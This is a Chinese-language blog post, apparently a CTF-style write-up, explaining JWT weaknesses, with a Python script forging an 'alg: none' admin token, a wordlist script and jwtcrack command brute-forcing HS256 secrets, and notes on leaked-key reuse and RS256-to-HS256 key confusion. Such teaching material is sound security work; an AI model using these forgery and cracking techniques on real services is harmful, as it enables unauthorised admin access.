@@ -1,0 +1,619 @@
+
+
+<!DOCTYPE html>
+<html lang="en-US" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/images/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="zkuan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fxxking JWT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JsonWebToken(JWT)">
+<meta property="og:url" content="https://whoiszkuan.github.io/2022/01/22/JsonWebToken-JWT/index.html">
+<meta property="og:site_name" content="4CH4N ZKUAN">
+<meta property="og:description" content="Fxxking JWT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/jwt_token.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20191112150846485.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117130007298.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117131242876.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120115140619.png">
+<meta property="og:image" content="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120174847610.png">
+<meta property="article:published_time" content="2022-01-22T13:22:22.000Z">
+<meta property="article:modified_time" content="2022-01-22T13:23:49.366Z">
+<meta property="article:author" content="zkuan">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/zku4n/picgo/raw/master/img/jwt_token.png">
+  
+  
+  <title>JsonWebToken(JWT) - 4CH4N ZKUAN</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/themes/prism-okaidia.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"whoiszkuan.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4CH4N ZKUAN" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x95cn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/images/banner1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="JsonWebToken(JWT)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-22 21:22" pubdate>
+        January 22, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      36 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JsonWebToken(JWT)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h1><p>JSON Web Token(JWT)是目前最流行的跨域认证解决方案。遵循JSON格式，将用户信息加密到token里，服务器不保存如何用户信息，只保存密钥信息，通过特定加密算法验证token，通过token验证用户身份。可替代传统cookie+session。</p>
+<h2 id="JWT令牌结构"><a href="#JWT令牌结构" class="headerlink" title="JWT令牌结构"></a>JWT令牌结构</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/jwt_token.png" srcset="/img/loading.gif" lazyload alt="智威汤逊"></p>
+<p>令牌均采用Base64编码，且由三部分组成：</p>
+<ul>
+<li>header</li>
+<li>payload</li>
+<li>signature</li>
+</ul>
+<p>三段加密字符串通过<code>.</code>拼接起来生成了JWT的token。</p>
+<ul>
+<li>base64url加密是先做base64加密，然后再将 <code>-</code> 替代 <code>+</code> 及 <code>_</code> 替代 <code>/</code> 。</li>
+</ul>
+<div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">JWT 规定了7个官方字段，供选用
+iss (issuer)：签发人
+exp (expiration time)：过期时间
+sub (subject)：主题
+aud (audience)：受众
+nbf (Not Before)：生效时间
+iat (Issued At)：签发时间
+jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20191112150846485.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>1.修改算法为none<br>2.修改算法从RS256到HS256<br>3.信息泄漏 密钥泄漏<br>4.爆破密钥</p>
+<h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><p>根据TIPS，我们要访问<code>/admin/</code>文件夹</p>
+<p>访问时发现cookie中携带有jwt格式的token</p>
+<p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDIzODY5MDksImV4cCI6MTY0MjM5NDEwOSwibmJmIjoxNjQyMzg2OTA5LCJzdWIiOiJ1c2VyIiwianRpIjoiNzkwYWZjNzE2ODQwNmJlZWNhNDExNTdkNjMzM2IwMmEifV0</code></p>
+<p>使用<code>jwt.io</code>发现加密为None，因此只要将<code>sub</code>的值修改为<code>admin</code>再加密即可。</p>
+<p><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDIzODY5MDksImV4cCI6MTY0MjM5NDEwOSwibmJmIjoxNjQyMzg2OTA5LCJzdWIiOiJhZG1pbiIsImp0aSI6Ijc5MGFmYzcxNjg0MDZiZWVjYTQxMTU3ZDYzMzNiMDJhIn1d</code></p>
+<p>携带着这个cookie访问<code>admin</code>即可</p>
+<h2 id="算法修改"><a href="#算法修改" class="headerlink" title="算法修改"></a>算法修改</h2><p>JWT支持将算法设定为”none”，如果将”alg”字段设为”none”，那么签名将会置空，将签名置空将可以伪造任何想要的token。</p>
+<p>使用python进行jwt编码：</p>
+<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwt
+
+token_dict &#x3D; &#123;
+  &quot;iss&quot;: &quot;admin&quot;,
+  &quot;iat&quot;: 1642391959,
+  &quot;exp&quot;: 1642399159,
+  &quot;nbf&quot;: 1642391959,
+  &quot;sub&quot;: &quot;admin&quot;,
+  &quot;jti&quot;: &quot;e80ebdc089f5347ebe9d6afedc252a73&quot;
+&#125;
+
+headers &#x3D; &#123;
+  &quot;alg&quot;: &quot;none&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+  &#125;
+
+jwt_token &#x3D; jwt.encode(token_dict,&quot;&quot;,algorithm&#x3D;&quot;none&quot;,headers&#x3D;headers)
+
+print(jwt_token)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<ul>
+<li>小坑：<code>headers</code>中的<code>alg</code>为<code>none</code>，在encode时，<code>algorithm</code>也必须为<code>none</code>均为小写</li>
+</ul>
+<h2 id="HS256密钥爆破"><a href="#HS256密钥爆破" class="headerlink" title="HS256密钥爆破"></a>HS256密钥爆破</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117130007298.png" srcset="/img/loading.gif" lazyload alt="image-20220117130007298"></p>
+<p>解码得算法为<code>HS256</code></p>
+<p>可通过工具对其进行爆破：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)</a></p>
+<p>或者自己写脚本爆破：</p>
+<div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import jwt
+
+token &#x3D; &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NDIxNSwiZXhwIjoxNjQyNDAxNDE1LCJuYmYiOjE2NDIzOTQyMTUsInN1YiI6InVzZXIiLCJqdGkiOiJkZmU5NzZmOGY3NDlhZDQ4ODk5ZjVjNTgwZDM2NmU3ZCJ9.dSpJxOw7fTEeHqGRMehKrpUypITCYL8tXBsWXkhZSKA&quot;
+
+passwd &#x3D; &quot;E:\zkuan\PythonHacker\passwd.txt&quot;
+
+with open(passwd) as file:
+    for line in file:
+        line &#x3D; line.strip()
+        try:
+            jwt.decode(token,verify&#x3D;True,key&#x3D;line,algorithms&#x3D;&quot;HS256&quot;)
+            print(&quot;key:&quot;,line)
+            break
+        except (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAlgorithmError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
+            print(&quot;key:&quot;,line)
+            break
+        except jwt.exceptions.InvalidSignatureError:
+            print(&quot;Failed&quot;,line)
+            continue
+    else:
+        print(&quot;NOT FOUND&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>将token设为自己的token值，设置自己的字典路径，即可进行爆破。</p>
+<p>将爆破出来的密钥填写进去，修改<code>sub</code>为<code>admin</code>，编码后携带此cookie访问目标。</p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>使用<code>jwtcrack</code>进行爆破</p>
+<p><code>./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjM5NjIyMywiZXhwIjoxNjQyNDAzNDIzLCJuYmYiOjE2NDIzOTYyMjMsInN1YiI6InVzZXIiLCJqdGkiOiI4YmVlNTBiMjRiOGYwY2M4NzAzYmZhMzVjNTUxYTQ4NyJ9.N4EmgLhTvprtFfMV4WZkX0TLkJYckUnY-iI8czZ_IDg</code></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220117131242876.png" srcset="/img/loading.gif" lazyload alt="image-20220117131242876"></p>
+<p>爆破出密钥<code>aaab</code></p>
+<h2 id="公私钥泄露"><a href="#公私钥泄露" class="headerlink" title="公私钥泄露"></a>公私钥泄露</h2><p>根据提示，</p>
+<div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);
+  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);
+  res.cookie(&#39;auth&#39;,token);
+  res.end(&#39;where is flag?&#39;);
+  
+&#125;);
+
+router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;
+	var flag&#x3D;&quot;flag_here&quot;;
+	res.type(&#39;html&#39;);
+	var auth &#x3D; req.cookies.auth;
+	var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public key
+	jwt.verify(auth, cert, function(err, decoded) &#123;
+	  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;
+	  	res.end(flag);
+	  &#125;else&#123;
+	  	res.end(&#39;you are not admin&#39;);
+	  &#125;
+	&#125;);
+&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>为公私钥泄露，访问<code>/public.key</code>和<code>/private.key</code>将公私钥下载下来。</p>
+<p>本地搭建环境进行测试</p>
+<p>创建环境结构：<code>npx express-generator</code></p>
+<p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120115140619.png" srcset="/img/loading.gif" lazyload alt="image-20220120115140619"></p>
+<p>将源码进行修改，并将公私钥放入<code>/public</code>目录下。</p>
+<p>使用<code>npm start</code>启动测试环境</p>
+<p>所得到的cookie就是带有私钥的admin权限的cookie。</p>
+<p>将生成的cookie放入靶场cookie内进行post请求。</p>
+<h2 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><blockquote>
+<p>RS256(采用SHA-256的RSA签名)，是一种非对称算法，使用公私钥对：标识提供方采用私钥生成签名，使用方获取公钥以验证签名。由于公钥与私钥相比不需要保护，因此大多数标识提供方使其易于使用方获取和使用(通常通过一个元数据URL。)</p>
+<p>另外一方面，HS256(带有SHA-256的HMAC是一种对称算法，双方共享一个密钥，使用相同的密钥生成签名和验证签名)，因此，如果公钥泄露，可使用HS256进行密钥混淆攻击。</p>
+</blockquote>
+<p>由于公钥通常可以从元数据URL节点获得，因此可以对客户端进行编程以自动检索公钥。如果采用这种方式，从服务器上直接下载公钥信息，可以有效减少配置信息。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>某些库对签名/验证HMAC对称加密的密钥和包含用于验证RSA签名令牌的公钥的密钥使用相同的变量名。</p>
+<p>通过将算法调整为HMAC变体(HS256/HS384/HS512)并使用公共可用公钥对其进行签名，我们可以欺骗服务使用变量中的硬编码公钥验证HMAC令牌。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20220120174847610.png" srcset="/img/loading.gif" lazyload alt="image-20220120174847610"></p>
+<p>将<code>user</code>改为<code>admin</code>，算法<code>RS256</code>修改为<code>HS256</code>，使用HS256算法验证签名。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WebSec/">WebSec</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Security/">Security</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/10/File-Include/">
+                        <span class="hidden-mobile">File Include</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
